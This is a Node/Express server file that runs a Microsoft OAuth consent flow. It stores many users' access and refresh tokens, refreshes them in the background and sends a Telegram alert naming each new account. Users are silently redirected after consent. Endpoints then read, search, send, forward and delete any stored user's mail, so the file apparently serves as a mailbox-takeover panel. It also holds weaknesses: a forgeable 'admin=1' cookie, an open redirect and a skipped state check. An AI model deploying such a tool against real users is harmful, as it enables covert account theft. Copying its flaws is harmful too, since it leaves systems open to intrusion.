import express from "express";
import { CONFIG } from "./src/config.js";
import { TokenStore, isExpired } from "./src/tokenStore.js";
import {
  buildAuthState,
  buildAuthorizeUrl,
  exchangeCodeForTokens,
  refreshAccessToken,
} from "./src/oauth.js";
import {
  getMe,
  listMail,
  sendMail,
  getMail,
  listSentMail,
  listMailFolders,
  listMailInFolder,
  listDrafts,
  createDraft,
  updateDraft,
  sendDraft,
  deleteMail,
  markAsRead,
  moveMessage,
  copyMessage,
  replyToMessage,
  replyAllToMessage,
  forwardMessage,
  flagMessage,
  searchMail,
} from "./src/graph.js";
import { identityFromTokensAndMe } from "./src/userIdentity.js";
import { notifyTelegram } from "./src/notifyTelegram.js";

const app = express();
let store = null;

// In-memory auth transaction cache (sufficient for local usage)
let pendingAuth = null;
let lastUserKey = null;

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

function parseCookies(cookieHeader) {
  const out = {};
  if (!cookieHeader) return out;
  for (const part of cookieHeader.split(";")) {
    const [k, ...rest] = part.trim().split("=");
    if (!k) continue;
    out[k] = decodeURIComponent(rest.join("=") || "");
  }
  return out;
}

function isAdminAuthed(req) {
  if (!CONFIG.adminPassword) return true;
  const cookies = parseCookies(req.headers.cookie);
  return cookies.admin === "1";
}

function wantsHtml(req) {
  const a = String(req.headers.accept || "");
  return a.includes("text/html") || a.includes("*/*");
}

function loginPage(nextPath = "/") {
  return html(
    "Login",
    `<h2>Admin Login</h2>
<form method="POST" action="/login">
  <input type="hidden" name="next" value="${String(nextPath).replace(/"/g, "&quot;")}" />
  <label>Password</label><br/>
  <input type="password" name="password" autofocus />
  <button type="submit">Login</button>
</form>`,
  );
}

// Password gate (enabled when ADMIN_PASSWORD is set)
app.use((req, res, next) => {
  if (!CONFIG.adminPassword) return next();

  // Allow Microsoft redirect and login endpoints without prior auth
  if (req.path === "/callback" || req.path === "/login" || req.path === "/auth/start") return next();

  if (isAdminAuthed(req)) return next();

  if (wantsHtml(req)) {
    const nextPath = req.originalUrl || "/";
    return res.status(401).type("html").send(loginPage(nextPath));
  }
  return res.status(401).json({ ok: false, error: "Unauthorized" });
});

app.get("/login", (req, res) => {
  const nextPath = typeof req.query?.next === "string" ? req.query.next : "/";
  res.status(401).type("html").send(loginPage(nextPath));
});

app.post("/login", (req, res) => {
  if (!CONFIG.adminPassword) return res.redirect("/");
  const password = String(req.body?.password || "");
  const nextPath = String(req.body?.next || "/");
  if (password !== CONFIG.adminPassword) {
    return res.status(401).type("html").send(html("Login failed", "<p>Wrong password.</p><p><a href='/'>Try again</a></p>"));
  }
  const secure = String(CONFIG.redirectUri || "").startsWith("https://");
  res.setHeader(
    "Set-Cookie",
    `admin=1; Path=/; HttpOnly; SameSite=Lax${secure ? "; Secure" : ""}`,
  );
  return res.redirect(nextPath);
});

app.get("/admin/logout", (_req, res) => {
  res.setHeader("Set-Cookie", "admin=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax");
  res.redirect("/");
});

// Choose token persistence:
// - If DATABASE_URL is set, persist tokens in Postgres (recommended for Render)
// - Else, fall back to file-based tokens/ directory
if (process.env.DATABASE_URL) {
  const { PostgresTokenStore } = await import("./src/postgresTokenStore.js");
  store = new PostgresTokenStore(process.env.DATABASE_URL);
  await store.ensureSchema();
  console.log("Token store: PostgreSQL");
} else {
  store = new TokenStore();
  console.log("Token store: filesystem (tokens/)");
}

function mustConfig() {
  if (!CONFIG.clientId) {
    const msg =
      "Missing CLIENT_ID. Create config.env from config.example.env and set CLIENT_ID.";
    const err = new Error(msg);
    err.status = 500;
    throw err;
  }

  const ru = String(CONFIG.redirectUri || "");
  const isLocal =
    ru.startsWith("http://localhost") ||
    ru.startsWith("http://127.0.0.1") ||
    ru.startsWith("http://[::1]");

  // If you're running as a "Web" (confidential) client in Entra (typical for Render),
  // the token endpoint requires client authentication (client_secret or client_assertion).
  if (!isLocal && !CONFIG.clientSecret) {
    const err = new Error(
      "Missing CLIENT_SECRET for non-local redirect URI. This server redeems the auth code server-side, so Entra requires a Web (confidential) client secret. Set CLIENT_SECRET (and CLIENT_ID) as environment variables in your hosting platform (e.g. Render Dashboard → Environment). Note: config.example.env is only a template; it is not automatically loaded on Render unless you deploy a real config.env file.",
    );
    err.status = 500;
    throw err;
  }
}

function html(title, body) {
  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>${title}</title>
  <style>
    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; padding: 24px; }
    code, pre { background: #f4f4f5; padding: 2px 6px; border-radius: 6px; }
    pre { padding: 12px; overflow: auto; }
    a { color: #0a58ca; }
  </style>
</head>
<body>
${body}
</body>
</html>`;
}

function reqUserKey(req) {
  const q = req?.query?.user;
  return typeof q === "string" && q.trim() ? q.trim() : lastUserKey;
}

async function getValidAccessToken(userKey) {
  if (!userKey) userKey = await store.mostRecentUserKey?.();
  if (!userKey) return null;
  const saved = await store.load(userKey);
  if (!saved) return null;

  if (!isExpired(saved, CONFIG.refreshSkewSeconds) && saved.access_token) return saved.access_token;

  if (!saved.refresh_token) return null;

  // Use the user's originally granted scopes for refresh
  const userScopes = saved.scope ? saved.scope.split(/\s+/) : CONFIG.scopes;

  const refreshed = await refreshAccessToken({
    tenantId: CONFIG.tenantId,
    clientId: CONFIG.clientId,
    clientSecret: CONFIG.clientSecret,
    scopes: userScopes, // Use the user's granted scopes
    refreshToken: saved.refresh_token,
  });

  // Use the user's saved scopes for refresh (whatever Microsoft originally granted)
  const expiresAt = new Date(Date.now() + (refreshed.expires_in || 0) * 1000).toISOString();
  const merged = {
    ...saved,
    ...refreshed,
    expires_at: expiresAt,
    scope: refreshed.scope || saved.scope, // Keep the user's granted scopes
    scope_differs_from_default: saved.scope_differs_from_default, // Preserve the flag
  };
  await store.save(userKey, merged);
  return merged.access_token;
}

async function requireAccess(req, res) {
  const userKey = reqUserKey(req);
  const accessToken = await getValidAccessToken(userKey);
  if (!accessToken) {
    res
      .status(401)
      .json({ ok: false, error: "Not authenticated for this user. Visit /auth/start or pass ?user=<user_key>.", user_key: userKey || null });
    return null;
  }
  return { userKey, accessToken };
}

async function refreshTokensIfNeeded() {
  const users = await store.list();
  for (const u of users) {
    const userKey = u.user_key;
    if (!userKey) continue;
    try {
      const saved = await store.load(userKey);
      if (!saved?.refresh_token) continue;
      if (!isExpired(saved, CONFIG.refreshSkewSeconds)) continue;
      // triggers refresh+save
      await getValidAccessToken(userKey);
    } catch (e) {
      console.warn(`Background refresh failed for ${userKey}:`, e?.message || e);
    }
  }
}

app.get("/", async (_req, res) => {
  const users = await store.list();
  const saved = lastUserKey ? await store.load(lastUserKey) : null;
  const body = `
  <h2>Microsoft OAuth Redirect URI Server</h2>
  <p>Config:</p>
  <pre>${JSON.stringify(
    {
      tenantId: CONFIG.tenantId,
      clientId: CONFIG.clientId ? `${CONFIG.clientId.slice(0, 6)}...` : "",
      redirectUri: CONFIG.redirectUri,
      scopes: CONFIG.scopes,
    },
    null,
    2,
  )}</pre>
  <p>Stored users:</p>
  <pre>${JSON.stringify(users, null, 2)}</pre>
  <ul>
    <li><a href="/auth/start">Start consent/login</a></li>
    <li><a href="/users">List users (JSON)</a></li>
    <li><a href="/token/status">Token status</a></li>
    <li><a href="/me">Graph: /me</a></li>
    <li><a href="/mail?top=10">Graph: /me/messages</a></li>
    <li><a href="/mail/send?to=you@example.com&subject=Hello&body=Test">Graph: send mail</a></li>
    <li><a href="/logout">Clear tokens</a></li>
  </ul>
  <p>Token persistence: <code>${process.env.DATABASE_URL ? "PostgreSQL (DATABASE_URL)" : "filesystem (tokens/)"}<\/code></p>
  <p>Active user: <code>${lastUserKey || "none"}</code></p>
  <p>Active user saved_at: <code>${saved?.saved_at || "no"}</code></p>
  <p>Tip: choose a user by adding <code>?user=&lt;user_key&gt;</code> to /me, /mail, /mail/send.</p>
  `;
  res.type("html").send(html("MS OAuth Redirect Server", body));
});

app.get("/auth/start", async (_req, res, next) => {
  try {
    mustConfig();
    const tx = buildAuthState();
    const data = {
      createdAt: Date.now(),
      ...tx,
    };

    if (store.savePendingAuth) {
      await store.savePendingAuth(tx.state, data);
    } else {
      pendingAuth = data;
    }

    const url = buildAuthorizeUrl({
      tenantId: CONFIG.tenantId,
      clientId: CONFIG.clientId,
      redirectUri: CONFIG.redirectUri,
      scopes: CONFIG.scopes,
      state: tx.state,
      nonce: tx.nonce,
      codeChallenge: tx.codeChallenge,
    });

    res.redirect(url);
  } catch (e) {
    next(e);
  }
});

app.get("/callback", async (req, res, next) => {
  try {
    mustConfig();

    const { code, state, error, error_description } = req.query || {};
    if (error) {
      return res
        .status(400)
        .type("html")
        .send(
          html(
            "OAuth Error",
            `<h2>OAuth Error</h2><pre>${JSON.stringify(
              { error, error_description },
              null,
              2,
            )}</pre><p><a href="/">Back</a></p>`,
          ),
        );
    }

    if (!code || typeof code !== "string") {
      return res.status(400).type("html").send(html("Missing code", "<p>Missing <code>code</code>.</p>"));
    }

    const tx = store.getPendingAuth ? await store.getPendingAuth(state) : pendingAuth;

    if (!tx || (state !== tx.state && !store.getPendingAuth)) {
      return res
        .status(400)
        .type("html")
        .send(
          html(
            "State mismatch",
            "<p>State mismatch or no pending auth session found. If you are using Render, this can happen if the server restarted during login. Start again at <a href='/auth/start'>/auth/start</a>.</p>",
          ),
        );
    }

    const tokenJson = await exchangeCodeForTokens({
      tenantId: CONFIG.tenantId,
      clientId: CONFIG.clientId,
      clientSecret: CONFIG.clientSecret,
      redirectUri: CONFIG.redirectUri,
      scopes: CONFIG.scopes,
      code,
      codeVerifier: tx.codeVerifier,
    });

    // Accept all granted scopes from Microsoft (don't filter)
    const grantedScopes = tokenJson.scope ? tokenJson.scope.split(/\s+/) : [];
    const requestedScopes = CONFIG.scopes;
    const scopesDifferFromDefault = grantedScopes.length !== requestedScopes.length ||
                                   !grantedScopes.every(scope => requestedScopes.includes(scope));

    console.log(`🔍 Requested scopes: ${requestedScopes.length}`);
    console.log(`📋 Granted scopes: ${grantedScopes.length}`);
    console.log(`📊 Scopes differ from default: ${scopesDifferFromDefault}`);

    const expiresAt = new Date(Date.now() + (tokenJson.expires_in || 0) * 1000).toISOString();
    const withExpiry = {
      ...tokenJson,
      scope: grantedScopes.join(' '), // Save ALL granted scopes
      scope_differs_from_default: scopesDifferFromDefault, // Track if scopes differ
      expires_at: expiresAt,
    };

    // Determine which user this token belongs to (Graph /me + id_token claims),
    // then save to tokens/<userKey>.json
    const me = await getMe(withExpiry.access_token);
    const ident = identityFromTokensAndMe({ tokens: withExpiry, me });
    lastUserKey = ident.userKey;
    const saved = await store.save(ident.userKey, {
      ...withExpiry,
      user: ident.user,
    });

    // one-time use
    if (store.deletePendingAuth) {
      await store.deletePendingAuth(state);
    } else {
      pendingAuth = null;
    }

    // Optional: notify Telegram on new connection
    // Non-blocking: do not fail the auth flow if Telegram is down/misconfigured.
    (async () => {
      try {
        const email = saved?.user?.mail || saved?.user?.userPrincipalName || "unknown";
        const text = `✅ New Microsoft OAuth connection\nUser: ${email}\nUserKey: ${saved.user_key}\nTenant: ${saved?.user?.tenantId || CONFIG.tenantId}`;
        await notifyTelegram({
          botToken: CONFIG.telegramBotToken,
          chatId: CONFIG.telegramChatId,
          text,
        });
      } catch (e) {
        console.warn("Telegram notify failed:", e?.message || e);
      }
    })();

    // Default behavior: redirect the user to Microsoft (or any configured page).
    // If you want the debug success page, call: /callback?...&show=1
    const show = req.query?.show === "1" || req.query?.show === "true";
    if (!show) {
      return res.redirect(CONFIG.postAuthRedirect);
    }

    const body = `
      <h2>Success</h2>
      <p>Tokens saved for user <code>${saved.user_key}</code>.</p>
      <p>Scopes: <code>${saved.scope || "(none)"}</code></p>
      <p>Expires at: <code>${saved.expires_at}</code></p>
      <ul>
        <li><a href="${CONFIG.postAuthRedirect}">Continue</a></li>
        <li><a href="/me?user=${encodeURIComponent(saved.user_key)}">Graph: /me</a></li>
        <li><a href="/mail?top=10&user=${encodeURIComponent(saved.user_key)}">Graph: /me/messages</a></li>
        <li><a href="/">Home</a></li>
      </ul>
    `;
    return res.type("html").send(html("OAuth Success", body));
  } catch (e) {
    next(e);
  }
});

app.get("/users", async (_req, res) => {
  const users = await store.list();
  res.json({ ok: true, users, active_user: lastUserKey });
});

app.get("/token/status", async (_req, res) => {
  const saved = lastUserKey ? await store.load(lastUserKey) : null;
  const safe = saved
    ? {
        user_key: saved.user_key,
        user: saved.user,
        saved_at: saved.saved_at,
        token_type: saved.token_type,
        scope: saved.scope,
        expires_at: saved.expires_at,
        has_access_token: Boolean(saved.access_token),
        has_refresh_token: Boolean(saved.refresh_token),
      }
    : null;
  res.json({ ok: true, token: safe });
});

app.get("/me", async (req, res, next) => {
  try {
    const userKey = reqUserKey(req);
    const accessToken = await getValidAccessToken(userKey);
    if (!accessToken) {
      return res
        .status(401)
        .json({ ok: false, error: "Not authenticated for this user. Visit /auth/start or pass ?user=<user_key>." });
    }
    const me = await getMe(accessToken);
    res.json({ ok: true, user_key: userKey, me });
  } catch (e) {
    next(e);
  }
});

app.get("/mail", async (req, res, next) => {
  try {
    const userKey = reqUserKey(req);
    const accessToken = await getValidAccessToken(userKey);
    if (!accessToken) {
      return res
        .status(401)
        .json({ ok: false, error: "Not authenticated for this user. Visit /auth/start or pass ?user=<user_key>." });
    }
    const top = req.query?.top;
    const data = await listMail(accessToken, top);
    res.json({ ok: true, user_key: userKey, data });
  } catch (e) {
    next(e);
  }
});

app.get("/mail/sent", async (req, res, next) => {
  try {
    const userKey = reqUserKey(req);
    const accessToken = await getValidAccessToken(userKey);
    if (!accessToken) {
      return res
        .status(401)
        .json({ ok: false, error: "Not authenticated for this user. Visit /auth/start or pass ?user=<user_key>." });
    }
    const top = req.query?.top;
    const data = await listSentMail(accessToken, top);
    res.json({ ok: true, user_key: userKey, data });
  } catch (e) {
    next(e);
  }
});

app.get("/mail/:id", async (req, res, next) => {
  try {
    const userKey = reqUserKey(req);
    const accessToken = await getValidAccessToken(userKey);
    if (!accessToken) {
      return res
        .status(401)
        .json({ ok: false, error: "Not authenticated for this user. Visit /auth/start or pass ?user=<user_key>." });
    }
    const messageId = req.params.id;
    const data = await getMail(accessToken, messageId);
    res.json({ ok: true, user_key: userKey, data });
  } catch (e) {
    next(e);
  }
});

app.get("/mail/send", async (req, res, next) => {
  try {
    const userKey = reqUserKey(req);
    const accessToken = await getValidAccessToken(userKey);
    if (!accessToken) {
      return res
        .status(401)
        .json({ ok: false, error: "Not authenticated for this user. Visit /auth/start or pass ?user=<user_key>." });
    }
    const to = typeof req.query?.to === "string" ? req.query.to : "";
    const subject = typeof req.query?.subject === "string" ? req.query.subject : "";
    const bodyText = typeof req.query?.body === "string" ? req.query.body : "";
    const result = await sendMail(accessToken, { to, subject, bodyText });
    res.json({ ok: true, user_key: userKey, result });
  } catch (e) {
    next(e);
  }
});

// -------- JSON API (Gmail-like) --------
app.get("/api/mail/folders", async (req, res, next) => {
  try {
    const auth = await requireAccess(req, res);
    if (!auth) return;
    const data = await listMailFolders(auth.accessToken);
    res.json({ ok: true, user_key: auth.userKey, data });
  } catch (e) {
    next(e);
  }
});

app.get("/api/mail/folders/:id/messages", async (req, res, next) => {
  try {
    const auth = await requireAccess(req, res);
    if (!auth) return;
    const top = req.query?.top;
    const data = await listMailInFolder(auth.accessToken, req.params.id, top);
    res.json({ ok: true, user_key: auth.userKey, data });
  } catch (e) {
    next(e);
  }
});

app.get("/api/mail/drafts", async (req, res, next) => {
  try {
    const auth = await requireAccess(req, res);
    if (!auth) return;
    const top = req.query?.top;
    const data = await listDrafts(auth.accessToken, top);
    res.json({ ok: true, user_key: auth.userKey, data });
  } catch (e) {
    next(e);
  }
});

app.post("/api/mail/drafts", async (req, res, next) => {
  try {
    const auth = await requireAccess(req, res);
    if (!auth) return;
    const { to, cc, bcc, subject, bodyText, bodyHtml } = req.body || {};
    const draft = await createDraft(auth.accessToken, { to, cc, bcc, subject, bodyText, bodyHtml });
    res.status(201).json({ ok: true, user_key: auth.userKey, draft });
  } catch (e) {
    next(e);
  }
});

app.patch("/api/mail/drafts/:id", async (req, res, next) => {
  try {
    const auth = await requireAccess(req, res);
    if (!auth) return;
    const { to, cc, bcc, subject, bodyText, bodyHtml } = req.body || {};
    const draft = await updateDraft(auth.accessToken, req.params.id, { to, cc, bcc, subject, bodyText, bodyHtml });
    res.json({ ok: true, user_key: auth.userKey, draft });
  } catch (e) {
    next(e);
  }
});

app.post("/api/mail/drafts/:id/send", async (req, res, next) => {
  try {
    const auth = await requireAccess(req, res);
    if (!auth) return;
    const result = await sendDraft(auth.accessToken, req.params.id);
    res.json({ ok: true, user_key: auth.userKey, result });
  } catch (e) {
    next(e);
  }
});

app.post("/api/mail/send", async (req, res, next) => {
  try {
    const auth = await requireAccess(req, res);
    if (!auth) return;
    const { to, cc, bcc, subject, bodyText, bodyHtml, saveToSentItems } = req.body || {};
    const result = await sendMail(auth.accessToken, { to, cc, bcc, subject, bodyText, bodyHtml, saveToSentItems });
    res.json({ ok: true, user_key: auth.userKey, result });
  } catch (e) {
    next(e);
  }
});

app.post("/api/mail/:id/read", async (req, res, next) => {
  try {
    const auth = await requireAccess(req, res);
    if (!auth) return;
    const { isRead = true } = req.body || {};
    const result = await markAsRead(auth.accessToken, req.params.id, Boolean(isRead));
    res.json({ ok: true, user_key: auth.userKey, result });
  } catch (e) {
    next(e);
  }
});

app.post("/api/mail/:id/move", async (req, res, next) => {
  try {
    const auth = await requireAccess(req, res);
    if (!auth) return;
    const { destinationId } = req.body || {};
    if (!destinationId) return res.status(400).json({ ok: false, error: "destinationId is required" });
    const result = await moveMessage(auth.accessToken, req.params.id, destinationId);
    res.json({ ok: true, user_key: auth.userKey, result });
  } catch (e) {
    next(e);
  }
});

app.post("/api/mail/:id/copy", async (req, res, next) => {
  try {
    const auth = await requireAccess(req, res);
    if (!auth) return;
    const { destinationId } = req.body || {};
    if (!destinationId) return res.status(400).json({ ok: false, error: "destinationId is required" });
    const result = await copyMessage(auth.accessToken, req.params.id, destinationId);
    res.json({ ok: true, user_key: auth.userKey, result });
  } catch (e) {
    next(e);
  }
});

app.post("/api/mail/:id/flag", async (req, res, next) => {
  try {
    const auth = await requireAccess(req, res);
    if (!auth) return;
    const { flagStatus = "flagged" } = req.body || {};
    const result = await flagMessage(auth.accessToken, req.params.id, flagStatus);
    res.json({ ok: true, user_key: auth.userKey, result });
  } catch (e) {
    next(e);
  }
});

app.post("/api/mail/:id/reply", async (req, res, next) => {
  try {
    const auth = await requireAccess(req, res);
    if (!auth) return;
    const { comment } = req.body || {};
    const result = await replyToMessage(auth.accessToken, req.params.id, { comment });
    res.json({ ok: true, user_key: auth.userKey, result });
  } catch (e) {
    next(e);
  }
});

app.post("/api/mail/:id/replyAll", async (req, res, next) => {
  try {
    const auth = await requireAccess(req, res);
    if (!auth) return;
    const { comment } = req.body || {};
    const result = await replyAllToMessage(auth.accessToken, req.params.id, { comment });
    res.json({ ok: true, user_key: auth.userKey, result });
  } catch (e) {
    next(e);
  }
});

app.post("/api/mail/:id/forward", async (req, res, next) => {
  try {
    const auth = await requireAccess(req, res);
    if (!auth) return;
    const { to, comment } = req.body || {};
    if (!to || (Array.isArray(to) && to.length === 0)) {
      return res.status(400).json({ ok: false, error: "to is required" });
    }
    const result = await forwardMessage(auth.accessToken, req.params.id, { to, comment });
    res.json({ ok: true, user_key: auth.userKey, result });
  } catch (e) {
    next(e);
  }
});

app.delete("/api/mail/:id", async (req, res, next) => {
  try {
    const auth = await requireAccess(req, res);
    if (!auth) return;
    const result = await deleteMail(auth.accessToken, req.params.id);
    res.json({ ok: true, user_key: auth.userKey, result });
  } catch (e) {
    next(e);
  }
});

app.get("/api/mail/search", async (req, res, next) => {
  try {
    const auth = await requireAccess(req, res);
    if (!auth) return;
    const q = typeof req.query?.q === "string" ? req.query.q.trim() : "";
    if (!q) return res.status(400).json({ ok: false, error: "q (search query) is required" });
    const top = req.query?.top;
    const result = await searchMail(auth.accessToken, q, top);
    res.json({ ok: true, user_key: auth.userKey, result });
  } catch (e) {
    next(e);
  }
});

app.get("/logout", async (_req, res) => {
  const userKey = reqUserKey(_req);
  if (userKey) {
    await store.clear(userKey);
    if (lastUserKey === userKey) lastUserKey = null;
    pendingAuth = null;
    res
      .type("html")
      .send(html("Logged out", `<p>Deleted tokens for <code>${userKey}</code>. <a href='/'>Home</a></p>`));
  } else {
    await store.clearAll();
    pendingAuth = null;
    lastUserKey = null;
    res.type("html").send(html("Logged out", "<p>Deleted all saved tokens. <a href='/'>Home</a></p>"));
  }
});

app.use((err, _req, res, _next) => {
  const status = err?.status || 500;
  const payload = {
    ok: false,
    error: err?.message || "Server error",
  };
  if (process.env.DEBUG_ERRORS === "1") {
    payload.stack = err?.stack;
    payload.details = err?.details;
  }
  res.status(status).json(payload);
});

app.listen(CONFIG.port, () => {
  console.log(`Listening on http://localhost:${CONFIG.port}`);
  console.log(`Start here:  http://localhost:${CONFIG.port}/`);
  console.log(`Redirect URI must be: ${CONFIG.redirectUri}`);
  // Log available CLIENT_* keys to help debug typos in hosting platform
  const clientKeys = Object.keys(process.env).filter(k => k.startsWith("CLIENT"));
  console.log(`Available CLIENT_* env keys: ${JSON.stringify(clientKeys)}`);

  console.log(`CLIENT_ID configured: ${Boolean(CONFIG.clientId)}`);
  console.log(`CLIENT_SECRET configured: ${Boolean(CONFIG.clientSecret)}`);
  console.log(`CLIENT_SECRET length: ${CONFIG.clientSecret ? CONFIG.clientSecret.length : 0}`);
  console.log(`DATABASE_URL configured: ${Boolean(process.env.DATABASE_URL)}`);
  console.log(`REFRESH_SKEW_SECONDS: ${CONFIG.refreshSkewSeconds}`);
  if (CONFIG.refreshEverySeconds > 0) {
    console.log(`Background refresh enabled: every ${CONFIG.refreshEverySeconds}s`);
    // Kick off an initial refresh shortly after boot, then periodically.
    setTimeout(() => {
      refreshTokensIfNeeded().catch((e) => console.warn("Initial refresh failed:", e?.message || e));
    }, 2000);
    setInterval(() => {
      refreshTokensIfNeeded().catch((e) => console.warn("Periodic refresh failed:", e?.message || e));
    }, CONFIG.refreshEverySeconds * 1000);
  }
});


